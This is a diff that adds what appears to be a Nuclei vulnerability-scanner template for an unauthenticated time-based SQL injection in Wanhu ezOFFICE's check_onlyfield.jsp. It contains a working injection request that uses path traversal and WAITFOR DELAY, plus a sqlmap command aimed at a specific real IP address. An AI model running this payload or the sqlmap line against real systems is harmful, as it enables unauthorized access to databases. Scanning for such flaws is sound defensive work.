@@ -1,0 +1,43 @@
+id: wanhu-ezoffice-check_onlyfield-sqli
+
+info:
+  name: 万户 ezoffice check_onlyfield.jsp - sqli
+  author: leadlife
+  severity: high
+  description: 万户ezOFFICE check_onlyfield.jsp未对用户输入的SQL语句进行过滤或验证导致出现SQL注入漏洞，未经身份验证的攻击者可以利用此漏洞获取数据库敏感信息。
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-query: 
+    sqlmap: sqlmap -u "http://8.142.133.144:7001/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../platform/custom/custom_form/run/checkform/check_onlyfield.jsp?fieldId=1" -p fieldId --batch --dbms=mssql --risk 3 --level 5 --technique=T
+  tags: wanhu,2023,oa,sqli,time,ezoffice
+
+http:
+  - raw:
+      - |+
+        GET /defaultroot/login.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+      - |+
+        @timeout: 15s
+        GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../platform/custom/custom_form/run/checkform/check_onlyfield.jsp?fieldId=1);WAITFOR+DELAY+'0:0:6'-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
+        Accept-Encoding: gzip, deflate
+        X-Forwarded-For: 127.0.0.1
+        X-Originating-IP: 127.0.0.1
+        X-Remote-Addr: 127.0.0.1
+        X-Remote-IP: 127.0.0.1
+        Accept-Language: zh-CN,zh;
+        Accept: */*
+        Connection: close
+        
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - contains(body_1,'defaultroot')
+          - duration_2 >= 5 && duration_2 <= 9
+        condition: and
